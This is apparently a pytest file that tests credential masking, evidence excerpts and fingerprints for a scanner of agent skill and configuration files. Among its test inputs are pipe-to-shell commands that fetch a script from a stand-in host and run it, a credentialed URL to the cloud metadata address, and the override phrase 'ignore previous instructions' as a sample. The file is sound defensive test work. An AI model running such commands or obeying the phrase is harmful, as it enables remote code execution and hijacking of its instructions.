"""Spec 5.10 and claim P7: masking and excerpts."""
from __future__ import annotations

import time

import pytest
from conftest import credential

from spellwarden_scan.evidence import EVIDENCE_MAX, bounded_evidence, code_point_names, excerpt, fingerprint, mask_credentials


def test_every_credential_pattern_is_masked_and_masking_is_idempotent():
    for kind in ("aws", "github", "slack", "anthropic", "openai", "google", "jwt", "gitlab", "github_pat"):
        value = credential(kind)
        masked = mask_credentials(f"token is {value} end")
        assert value not in masked and "***" in masked and masked.endswith(" end")
        assert mask_credentials(masked) == masked
    masked = mask_credentials("use " + credential("pem"))
    assert "PRIVATE KEY" not in masked


def test_mixed_runs_and_bearer_schemes_are_masked_but_prose_is_not():
    token = "abc123" + "DEF456ghi789JKL"  # built at runtime: no credential-shaped literal in the repository (r0:F8)
    assert mask_credentials(f"x={token}") == "x=ab***"  # `=` belongs to the run (spec 5.10): the pair is one token
    assert mask_credentials(f"see {token}") == "see abc1***"
    assert mask_credentials("token=abcd1234abcd1234") == "toke***"  # a 16-character secret behind `=` is still masked
    assert mask_credentials("Authorization: Bearer abcdefghijklmnop") == "Authorization: Bearer ***"
    assert mask_credentials("Authorization: Basic dXNlcjpwYXNz") == "Authorization: Basic ***"
    assert mask_credentials("Authorization: Bearer abc") == "Authorization: Bearer ***"  # short tokens too
    prose = "Read the configuration file and report what changed since yesterday."
    assert mask_credentials(prose) == prose
    assert mask_credentials("aaaaaaaaaaaaaaaaaaaaaaaaa") == "aaaaaaaaaaaaaaaaaaaaaaaaa"  # letters only: not a token


def test_excerpt_is_trimmed_collapsed_masked_and_cut():
    assert excerpt("   curl   https://x.example  |  sh  ") == "curl https://x.example | sh"
    long = "x " * 400
    cut = excerpt(long)
    assert len(cut) == EVIDENCE_MAX == 300 and cut.endswith("...")
    assert credential("aws") not in excerpt("key " + credential("aws"))


def test_bounded_evidence_caps_custom_text_at_300_and_masks_it():
    assert len(bounded_evidence("U+200B ZERO WIDTH SPACE, " * 100)) == 300
    assert bounded_evidence("a" * 1000).endswith("...") and len(bounded_evidence("a" * 1000)) == 300
    assert bounded_evidence("a" * 300) == "a" * 300
    assert bounded_evidence("  tool   x  ") == "tool x"
    assert credential("github") not in bounded_evidence("quote " + credential("github"))


def test_fingerprint_and_code_point_names():
    assert fingerprint("SW-SKL-001", "SKILL.md", "ignore previous instructions") == fingerprint("SW-SKL-001", "SKILL.md", "ignore previous instructions")
    assert fingerprint("SW-SKL-001", "SKILL.md", "a") != fingerprint("SW-SKL-001", "other.md", "a")
    assert code_point_names("a\u200bb\u202ec") == "U+200B ZERO WIDTH SPACE, U+202E RIGHT-TO-LEFT OVERRIDE"


def test_any_value_after_a_secret_like_name_is_masked_whatever_its_shape():
    """Security review: an unquoted, short or letters-only value after `password=`, `token:` or `api_key=` left
    the 20-character and quoted rules untouched; it is masked whole, placeholders excepted."""
    short = "hun" + "ter2"
    assert mask_credentials(f"password={short}") == "password=***"
    assert mask_credentials(f"export API_KEY={short}x") == "export API_KEY=***"
    assert mask_credentials(f"db_password: {short} # prod") == "db_password: *** # prod"
    assert mask_credentials(f'"client_secret": "{short}"') == '"client_secret": "***"'
    for kept in ("token=$TOKEN", "api_key=<your-key>", "password: ${DB_PASSWORD}", 'secret: "xxxx"', "password: <your password>"):
        assert mask_credentials(kept) == kept
    for leaked in ("x" + "yz$1abc", "my" + "example1", "s3cr" + "et<b>"):  # a placeholder word inside a real value
        assert mask_credentials(f"password={leaked}") == "password=***", leaked
    assert mask_credentials('password = "hunter two"') == 'password = "***"'  # masked to the closing quote
    assert mask_credentials("password=" + "abc,def;ghi&jk" + " next") == "password=*** next"  # to the next space
    # A default or a command may carry the secret itself: masked whole (security review of 478b8aa).
    for written in ("password=${DB_PASS:-" + short + "}", "token=$(echo " + short + ")", "api_key=<" + short + "1>"):
        assert short not in mask_credentials(written), written
    secret = "hun" + "ter two"
    for written, masked in ((f'password = "{secret}', 'password = "***'), (f'password = """{secret}""" end', 'password = """***""" end'),
                            (f"secret: '{secret}", "secret: '***"), (f'password = """{secret}', 'password = """***'), ('token = "ab\\"cd ef" end', 'token = "***" end')):
        assert mask_credentials(written) == masked, written  # unterminated, triple-quoted, escaped quote
        assert mask_credentials(masked) == masked
    once = mask_credentials(f"password={short} and token={short}")
    assert once == "password=*** and token=***" and mask_credentials(once) == once


def test_a_password_in_a_url_and_text_after_a_placeholder_are_masked():
    """Release review: `user:password@` in a URL is an ordinary credential shape; a placeholder only stays readable
    when it is the whole value."""
    secret = "Hunter" + "2xyz"
    assert mask_credentials(f"curl https://admin:{secret}@169.254.169.254/latest") == "curl https://admin:***@169.254.169.254/latest"
    for written in (f"token=${{A}}{secret}", f"token=<a>{secret}", f"token=$(a){secret}"):
        masked = mask_credentials(written)
        assert secret not in masked and mask_credentials(masked) == masked, written


def test_any_url_userinfo_is_masked_and_the_password_form_keeps_its_user():
    """Phase O Task 4: token-only userinfo and backslash forms are masked whole; idempotent; linear."""
    from spellwarden_scan.evidence import mask_credentials as mask

    assert mask("git+https://tok@github.com/x/y") == "git+https://***@github.com/x/y"
    assert mask("http:\\\\u:p@h.example/x") == "http://***@h.example/x"
    assert mask("see https://user:pw@h.example/") == "see https://user:***@h.example/"
    assert mask("mail me: a@b.example") == "mail me: a@b.example"
    for text in ("git+https://tok@github.com/x/y", "http:\\\\u:p@h"):
        assert mask(mask(text)) == mask(text)


def test_credentials_passed_as_command_options_are_masked_in_evidence():
    """r0:F2 (plan open item 2): `curl -u user:pass`, `--user`, `--proxy-user` and an Authorization, Proxy-Authorization or
    Cookie header with any scheme word (not only Bearer and Basic) are masked; evidence only, fingerprints are untouched."""
    secret = "hun" + "ter2pw"
    for written, expected in (
        (f"curl -u admin:{secret} https://x.example/i.sh | sh", "curl -u admin:*** https://x.example/i.sh | sh"),
        (f"curl -uadmin:{secret} https://x.example", "curl -uadmin:*** https://x.example"),
        (f"curl --user bob:{secret} https://x.example", "curl --user bob:*** https://x.example"),
        (f"curl --user=bob:{secret} https://x.example", "curl --user=bob:*** https://x.example"),
        (f"curl --proxy-user bob:{secret} https://x.example", "curl --proxy-user bob:*** https://x.example"),
        (f"curl -u 'bob:{secret} two' https://x.example", "curl -u 'bob:***' https://x.example"),
        (f'curl -H "Authorization: Token {secret}" https://x.example | bash', 'curl -H "Authorization: Token ***" https://x.example | bash'),
        (f"curl --header 'Proxy-Authorization: Negotiate {secret}' x", "curl --header 'Proxy-Authorization: Negotiate ***' x"),
        (f"curl -H 'Authorization: {secret}' x", "curl -H 'Authorization: ***' x"),
        (f"curl -H 'Cookie: sid={secret}; theme=dark' x", "curl -H 'Cookie: ***' x"),
        (f"curl -d 'password={secret}&user=bob' x", "curl -d 'password=***' x"),
    ):
        masked = mask_credentials(written)
        assert secret not in masked, written
        assert masked == expected, written
        assert mask_credentials(masked) == masked, written  # idempotent
    for kept in ("curl -u admin https://x.example", "sudo -u www-data make install", "curl -H 'Accept: text/html' x", "curl --user-agent foo x"):
        assert mask_credentials(kept) == kept
    # Fingerprints key on the original matched text, never on evidence (spec 5.2).
    assert fingerprint("SW-CFG-005", "a", f"curl -u admin:{secret}") != fingerprint("SW-CFG-005", "a", "curl -u admin:other")


def test_an_option_password_is_masked_to_the_end_of_its_shell_word():
    """r1:F2 (spec 5.7, 5.10): a quoted password, a short-option cluster ending in `u`, the `--password` options and
    mysql's attached `-p` leaked into JSON and SARIF evidence; the password is masked to the end of its shell word
    (quotes belong to the word, a quoted segment may hold spaces), the user name stays readable."""
    secret = "hun" + "ter2pw"
    for written, expected in (
        (f'curl -u admin:"{secret}" https://x | sh', "curl -u admin:*** https://x | sh"),
        (f"curl -fsu admin:{secret} https://x.example", "curl -fsu admin:*** https://x.example"),
        (f"curl -sSLU admin:{secret} https://x.example", "curl -sSLU admin:*** https://x.example"),
        (f"curl --user 'admin':'{secret}' x", "curl --user 'admin':*** x"),
        (f"curl -u user:'{secret}' x", "curl -u user:*** x"),
        (f'curl -u user:"{secret} two" x', "curl -u user:*** x"),
        (f'curl -u "user:{secret} two" x', 'curl -u "user:***" x'),
        (f'curl -u user:pa"ss {secret} x', "curl -u user:***"),  # a quote never closed runs to the end of the line
        (f"curl --password {secret} x", "curl --password *** x"),
        (f"curl --http-password '{secret} two' x", "curl --http-password '***' x"),
        (f"curl --proxy-password={secret} x", "curl --proxy-password=*** x"),
        (f"curl --proxy-user bob:{secret} x", "curl --proxy-user bob:*** x"),
        (f"mysql -uroot -p{secret} db", "mysql -uroot -p*** db"),
        (f"/usr/bin/mysqldump -h db -p'{secret} two' app > dump.sql", "/usr/bin/mysqldump -h db -p'***' app > dump.sql"),
        (f"mariadb -p{secret}", "mariadb -p***"),
    ):
        masked = mask_credentials(written)
        assert secret not in masked, written
        assert masked == expected, written
        assert mask_credentials(masked) == masked, written  # idempotent
    # Through the one evidence path every JSON and SARIF finding takes.
    assert secret not in bounded_evidence(f'curl -u admin:"{secret}" https://x | sh')
    # `-p` is too generic outside mysql: kept everywhere else, and after the mysql command has ended.
    for kept in ("ssh -p2222 host", "mkdir -p/tmp/x", "mysql -p db", "mysql db | tool -pkeep", "curl -u 'admin' x",
                 "git push -u origin main", "python -u run.py"):
        assert mask_credentials(kept) == kept, kept


def test_a_header_keeps_only_a_known_scheme_and_is_masked_to_its_closing_quote():
    """Spec 5.7, 5.10: any first word was kept as a scheme (`Authorization: <token> extra` showed the token), a quote
    inside the value ended the mask (`Bearer abc'd`), and Digest parameters after the first one leaked. Only Bearer,
    Basic, Token, Negotiate, Digest, NTLM and AWS4-HMAC-SHA256 stay; everything after them, to the closing quote of the
    opening quote or to the end of the line, becomes `***`; a cookie keeps no word."""
    secret, token = "hun" + "ter2pw", "s3cr" + "3tToken123"
    for written, expected in (
        (f'curl -H "Authorization: {token} extra" x', 'curl -H "Authorization: ***" x'),
        (f"Authorization: Bearer abc'd {secret}", "Authorization: Bearer ***"),
        (f'curl -H "Authorization: Bearer ab\'cd {secret}" x', 'curl -H "Authorization: Bearer ***" x'),
        (f"curl -H 'Authorization: Digest username=\"u\", nonce=\"n1\", response=\"{secret}\"' x",
         "curl -H 'Authorization: Digest ***' x"),
        (f"Authorization: AWS4-HMAC-SHA256 Credential=k/1/us/s3/aws4_request, Signature={secret}", "Authorization: AWS4-HMAC-SHA256 ***"),
        (f"authorization: ntlm {secret}", "authorization: ntlm ***"),
        (f'{{"Authorization": "Token {secret} x", "Accept": "a"}}', '{"Authorization": "Token ***", "Accept": "a"}'),
        (f'{{"Authorization": "Bearer a\\"{secret}", "Accept": "a"}}', '{"Authorization": "Bearer ***", "Accept": "a"}'),
        (f'curl -H "Proxy-Authorization: Custom {secret}" x', 'curl -H "Proxy-Authorization: ***" x'),
        (f"curl -H 'Cookie: session {secret}' x", "curl -H 'Cookie: ***' x"),
        (f"Set-Cookie: sid={secret}; Path=/", "Set-Cookie: ***"),
        (f"curl -H 'Authorization: Token {secret}' -H 'Cookie: a={secret}' x", "curl -H 'Authorization: Token ***' -H 'Cookie: ***' x"),
    ):
        masked = mask_credentials(written)
        assert secret not in masked and token not in masked, written
        assert masked == expected, written
        assert mask_credentials(masked) == masked, written  # idempotent
    for kept in ('{"Authorization": "", "Accept": "a"}', "curl -H 'Accept: text/html' x", "X-Authorization-Mode: on"):
        assert mask_credentials(kept) == kept, kept


def test_url_userinfo_is_masked_through_the_last_at_and_whole_when_too_long():
    """r0:F6 (spec 5.7, D34): userinfo stopped at the first `@`, so `https://tok@en@host` showed `en`, and userinfo over
    256 characters was not masked at all. It is masked through the last `@` before the authority ends (`/`, `?`, `#`,
    a backslash, whitespace or a quote); past the cap the whole authority is masked."""
    part = "tok" + "en"
    for written, expected in (
        (f"https://{part}@{part}@host.example/x", "https://***@host.example/x"),
        (f"git+https://{part}@a@b@github.com/x/y", "git+https://***@github.com/x/y"),
        (f'curl "https://{part}@{part}@host.example?a=b@c#d@e"', 'curl "https://***@host.example?a=b@c#d@e"'),
        (f"http:\\\\{part}@{part}@h.example\\x", "http://***@h.example\\x"),
        (f"git+https://{'tok' * 100}@github.com/x/y", "git+https://***/x/y"),
        (f"https://{'ab.cd' * 60}@{part}@host.example:8443/x", "https://***/x"),
        (f"x:https://{part}@{part}@host.example/x", "x:https://***@host.example/x"),
        ("smtp:alice@example.com", "smtp://***@example.com"),
    ):
        masked = mask_credentials(written)
        assert masked == expected, written
        assert mask_credentials(masked) == masked, written  # idempotent
    for kept in ("mail me: a@b.example", "https://host.example/a@b", "see https://user:***@h.example/", "https://@host.example/"):
        assert mask_credentials(kept) == kept, kept


def test_a_short_secret_after_a_secret_named_option_or_a_scoped_short_option_is_masked():
    """r2:F7 (spec 5.7): a short or letters-only secret leaked when it followed a secret-named long option written with
    a space (`--token x`), `authorization =`, `cookie =`, a `*_PWD`/`*_PASS` name, or a short option that carries a
    password only in one program (`sshpass -p`, `docker login -p`, `redis-cli -a`, curl's `-b`, `smbclient -U u%p`)."""
    secret = "hun" + "ter2x"
    for written, expected in (
        (f"tool --token {secret} run", "tool --token *** run"),
        (f"tool --api-key {secret}", "tool --api-key ***"),
        (f"tool --api_key {secret}", "tool --api_key ***"),
        (f"tool --apikey {secret}", "tool --apikey ***"),
        (f"tool --secret '{secret} two' x", "tool --secret '***' x"),
        (f"tool --client-secret={secret} x", "tool --client-secret=*** x"),
        (f"tool --auth {secret} x", "tool --auth *** x"),
        (f"tool --private-key {secret}", "tool --private-key ***"),
        (f"tool --credential {secret}", "tool --credential ***"),
        (f"tool --pwd {secret}", "tool --pwd ***"),
        (f"tool --passwd={secret}", "tool --passwd=***"),
        (f"redis-cli --pass {secret}", "redis-cli --pass ***"),
        (f"tool --authToken {secret}", "tool --authToken ***"),
        (f"curl --cookie 'sid={secret}' x", "curl --cookie '***' x"),
        (f"curl --cookie=sid={secret} x", "curl --cookie=*** x"),
        (f"tool --verbose --token {secret}", "tool --verbose --token ***"),
        (f"tool --token --password {secret}", "tool --token --password ***"),
        (f"authorization = {secret}", "authorization = ***"),
        (f"Proxy-Authorization = {secret}", "Proxy-Authorization = ***"),
        (f"cookie = sid={secret}", "cookie = ***"),
        (f"MYSQL_PWD={secret} mysql db", "MYSQL_PWD=*** mysql db"),
        (f"export DB_PASS={secret}", "export DB_PASS=***"),
        (f"smtp-pass: '{secret}'", "smtp-pass: '***'"),
        (f"sshpass -p {secret} ssh -p 22 host", "sshpass -p *** ssh -p 22 host"),
        (f"sshpass -p{secret} ssh host", "sshpass -p*** ssh host"),
        (f"docker login -u bob -p {secret} registry.example", "docker login -u bob -p *** registry.example"),
        (f"podman login -p '{secret}' registry.example", "podman login -p '***' registry.example"),
        (f"redis-cli -h db -p 6379 -a {secret} get k", "redis-cli -h db -p 6379 -a *** get k"),
        (f"curl -b sid={secret} https://x.example", "curl -b *** https://x.example"),
        (f"curl -sb 'sid={secret}' https://x.example", "curl -sb '***' https://x.example"),
        (f"curl -bsid={secret} https://x.example", "curl -b*** https://x.example"),
        (f"smbclient //h/s -U bob%{secret}", "smbclient //h/s -U bob%***"),
        (f"smbclient //h/s -Ubob%'{secret} two' -c ls", "smbclient //h/s -Ubob%*** -c ls"),
        (f"smbclient //h/s --user=bob%{secret}", "smbclient //h/s --user=bob%***"),
    ):
        for masked in (mask_credentials(written), bounded_evidence(written)):
            assert secret not in masked, written
            assert masked == expected, written
            assert mask_credentials(masked) == masked, written  # idempotent
    # Options that carry no secret, short options outside their program, and placeholders stay readable.
    for kept in ("echo x | docker login --password-stdin -u bob registry.example", "tool --token $GITHUB_TOKEN",
                 "tool --api-key '<your-key>'", "ssh -p 22 host", "docker run -p 80:80 img", "redis-cli -p 6379 ping",
                 "git log --author bob", "tool --oauth-client web", "tar -b 20 -cf x.tar d", "curl --data-binary @f x",
                 "sshpass -f pw.txt ssh host", "smbclient //h/s -U bob", "tool --keyboard us", "x -b sid=1", "author = bob",
                 "bypass_mode = on"):
        assert mask_credentials(kept) == kept, kept


_REPEATS = 40_000
_ADVERSARIAL = [
    # option masking (r1:F2): clusters with no `u`, endless clusters, unclosed and escaped quotes, mysql commands
    "-" + "a" * _REPEATS, "-u" * _REPEATS, "-fsu " * _REPEATS, '-u a:"' * _REPEATS, "-u '" * _REPEATS,
    '-u "' + "\\" * _REPEATS, "--password " * _REPEATS, "mysql " * _REPEATS, "mysql -p" * _REPEATS, "mysql '" * _REPEATS,
    # header masking: names with no colon, endless separators, quotes and escapes in the value
    "authorization" + " " * _REPEATS, "Authorization: " * _REPEATS, '"Authorization":"' * _REPEATS, "'Cookie: '" * _REPEATS,
    '"Authorization: Bearer ' + "\\" * _REPEATS, "Authorization: Digest " * _REPEATS,
    # URL userinfo (r0:F6): scheme-like words with no authority, endless userinfo, `@` runs, schemes inside an authority
    "a:" * _REPEATS, "x:@" * _REPEATS, "https://" + "a@" * _REPEATS, "a:/" * _REPEATS, "https://" + "a" * _REPEATS + "@h",
    "ab:" + "c:d@" * _REPEATS, "://a:" * _REPEATS, "x" + "y:" * _REPEATS + "//t@h", ("ab" * 15 + "c:") * _REPEATS,
    # secret-named options and program-scoped short options (r2:F7): endless options, names, unclosed quotes, commands
    "--token " * _REPEATS, "--token '" * _REPEATS, "--" + "a" * _REPEATS, "--a-" * _REPEATS, "--auth=" * _REPEATS,
    "--x --token" * _REPEATS, "sshpass -p" * _REPEATS, "sshpass " * _REPEATS, "docker login -p '" * _REPEATS,
    "redis-cli -a " * _REPEATS, "curl -" + "a" * _REPEATS, "curl -b" * _REPEATS, "smbclient -U a%" * _REPEATS,
    "smbclient -U " + "a" * _REPEATS, "a_pwd" * _REPEATS, "a" * _REPEATS + "_pass", "a_" * _REPEATS + "pwd =",
    "authorization " * _REPEATS, "cookie" + " " * _REPEATS, "-a-pass " * _REPEATS,
    # a user option before another credential option, a dash-led password (r4:R4-1)
    "-u --password " * _REPEATS, "-u -" * _REPEATS, "--password -" * _REPEATS, "-u -" + "a" * _REPEATS,
]


@pytest.mark.parametrize("text", _ADVERSARIAL, ids=[repr(text[:12]) for text in _ADVERSARIAL])
def test_masking_adversarial_lines_is_linear_and_idempotent(text):
    started = time.perf_counter()
    once = mask_credentials(text)
    assert time.perf_counter() - started < 1.0
    assert mask_credentials(once) == once


def test_a_bare_masked_value_never_joins_two_commands():
    """r3:N3 (spec 5.7, masking is idempotent): `ASSIGNED_VALUE` masked a bare `;` after an empty `NAME=`, so a second
    pass saw one command and masked `serve -p`. A value that is nothing but a command separator is no value; a value
    masked whole that swallows a separator is judged again as the commands it leaves."""
    secret = "hun" + "ter2x"
    for written, expected in (
        ("docker login --password= ; serve -p 8080", "docker login --password= ; serve -p 8080"),
        ("redis-cli -h h TOKEN= ; tool -a fast", "redis-cli -h h TOKEN= ; tool -a fast"),
        ("redis-cli -h h --token ; tool -a fast", "redis-cli -h h --token ; tool -a fast"),
        ("redis-cli -h h TOKEN= && tool -a fast | x", "redis-cli -h h TOKEN= && tool -a fast | x"),
        (f"redis-cli -h h TOKEN={secret}; tool -a fast", "redis-cli -h h TOKEN=*** tool -a ***"),
        (f"mysql -u root TOKEN={secret}; foo -pbar", "mysql -u root TOKEN=*** foo -p***"),
        (f"password: p@ss;{secret}", "password: ***"),
        (f"DB_PASS=Xy7&{secret}|q", "DB_PASS=***"),
        # a command name swallowed by an earlier value still has its own secret masked (r3:N3 follow-up)
        (f"tool --token x;docker login -p {secret}", "tool --token *** login -p ***"),
        (f"curl -u bob:x;docker login -p {secret}", "curl -u bob:*** login -p ***"),
        # an option is no value of the option before it (found by the generated lines below)
        (f"curl -u -u bob:{secret}", "curl -u -u bob:***"),
        (f"redis-cli --token= -u -u bob:{secret} -a DB_PASS=", "redis-cli --token= *** -u bob:*** -a ***"),
    ):
        masked = mask_credentials(written)
        assert secret not in masked, written
        assert masked == expected, written
        assert mask_credentials(masked) == masked, written


_FUZZ_WORDS = ["--token", "--token=", "hunter2x", "'hunter2x'", '"hunter2x"', "sshpass", "-p", "curl", "-b", "-sb",
               "smbclient", "-U", "bob%hunter2x", "docker", "login", "podman", "redis-cli", "-a", "DB_PASS=",
               "MYSQL_PWD=hunter2x", "authorization", "=", "cookie=", "|", ";", "&&", "&", "$TOKEN", "***", "<k>", "--",
               "-x", "--pass", "bob:hunter2x", "-u", "Bearer", "--password-stdin", "ssh", "22", "--api-key",
               "--user=bob%hunter2x", "-phunter2x", "-bhunter2x", "-ahunter2x", "echo", "mysql", "TOKEN=", "TOKEN=x;",
               "x;docker", "x;mysql", "a&b", "--password=", "password:", "'open", "-pbar"]


def test_masking_is_idempotent_on_generated_command_lines():
    """r3:N3: 16 of 150,000 random lines were not a fixed point (the reviewer's fuzz2.py); a fixed seed keeps it
    reproducible."""
    import random

    generator = random.Random(20261020)
    failures = []
    for _ in range(20_000):
        line = " ".join(generator.choice(_FUZZ_WORDS) for _ in range(generator.randint(1, 9)))
        once = mask_credentials(line)
        if mask_credentials(once) != once:
            failures.append(line)
    assert failures == []


def test_a_password_option_masks_a_password_that_starts_with_a_dash():
    """r4:R4-1 (spec 5.10): getopt and pflag take the next argument as the value of `--password`, so a password that
    begins with `-` is still masked; only a user option skips a next word that is itself a credential option."""
    secret = "-Xy9" + "zQ2pL"
    for written, expected in (
        (f"docker login -u bob --password {secret}", "docker login -u bob --password ***"),
        (f"wget --password {secret} https://x", "wget --password *** https://x"),
        (f"wget --http-password {secret} https://x", "wget --http-password *** https://x"),
        (f"curl --proxy-password {secret} x", "curl --proxy-password *** x"),
        (f"wget --password={secret} https://x", "wget --password=*** https://x"),
        (f"curl -u bob:{secret} x", "curl -u bob:*** x"),
        (f"lftp -u -bob:{secret} x", "lftp -u -bob:*** x"),
        # a user option's next word that is itself a credential option is no value: that option masks its own
        (f"curl -u -u bob:{secret}", "curl -u -u bob:***"),
        (f"curl -u --password {secret}", "curl -u --password ***"),
        (f"curl --user --proxy-password {secret}", "curl --user --proxy-password ***"),
        (f"curl -- -u -u --http-password {secret} -U", "curl -- -u -u --http-password *** -U"),
    ):
        masked = mask_credentials(written)
        assert secret[1:] not in masked, written
        assert masked == expected, written
        assert mask_credentials(masked) == masked, written


# The reviewer's differential vocabulary (dfz.py): option words, values, separators and assignments mixed at random.
_DIFFERENTIAL_WORDS = [
    "--token", "--token=", "S3cr", "'S3cr'", "-S3cr", "sshpass", "-p", "curl", "-b", "-sb", "smbclient", "-U", "bob%S3cr",
    "docker", "login", "redis-cli", "-a", "DB_PASS=", "MYSQL_PWD=S3cr", "authorization:", "=", "cookie=", "|", ";", "&&",
    "$TOKEN", "***", "--", "-x", "--pass", "bob:S3cr", "-u", "Bearer", "--password", "--password=", "--proxy-password",
    "--user", "mysql", "-pS3cr", "-bS3cr", "-aS3cr", "echo", "TOKEN=", "PASSWORD=", "-u", "--api-key", "bob:-S3cr", "wget",
    "--http-password"]
_PASSWORD_OPTIONS = frozenset({"--password", "--http-password", "--proxy-password"})
_USER_OPTIONS = frozenset({"-u", "-U", "--user"})


def _must_hide(words: list[str]) -> int:
    """How many secret words the masking before r3:N3 hid by option (and so must still hide): the word after a spaced
    password option, and a `user:pass` word after a user option, unless that option was itself the value of the word
    before it (a password or user option, or `Bearer`)."""
    hidden = 0
    for index in range(1, len(words)):
        word, option, before = words[index], words[index - 1], words[index - 2] if index >= 2 else ""
        if "S3cr" not in word or before in _PASSWORD_OPTIONS | _USER_OPTIONS | {"Bearer"}:
            continue
        if option in _PASSWORD_OPTIONS or (option in _USER_OPTIONS and ":" in word):
            hidden += 1
    return hidden


def test_masking_never_shows_a_secret_an_earlier_masking_hid():
    """r4:R4-1: the reviewer's differential fuzz (dfz.py) found 944 of 100,000 lines where the masking before r3:N3
    hid a secret that r3:N3's showed (`--password -S3cr`). The expectation is encoded directly: on a fixed seed, no
    line shows more secret words than it has, less those `_must_hide` counts."""
    import random

    generator = random.Random(1)
    failures = []
    for _ in range(30_000):
        words = [generator.choice(_DIFFERENTIAL_WORDS) for _ in range(generator.randint(2, 8))]
        masked = mask_credentials(" ".join(words))
        if masked.count("S3cr") > sum("S3cr" in word for word in words) - _must_hide(words):
            failures.append((" ".join(words), masked))
    assert failures == []
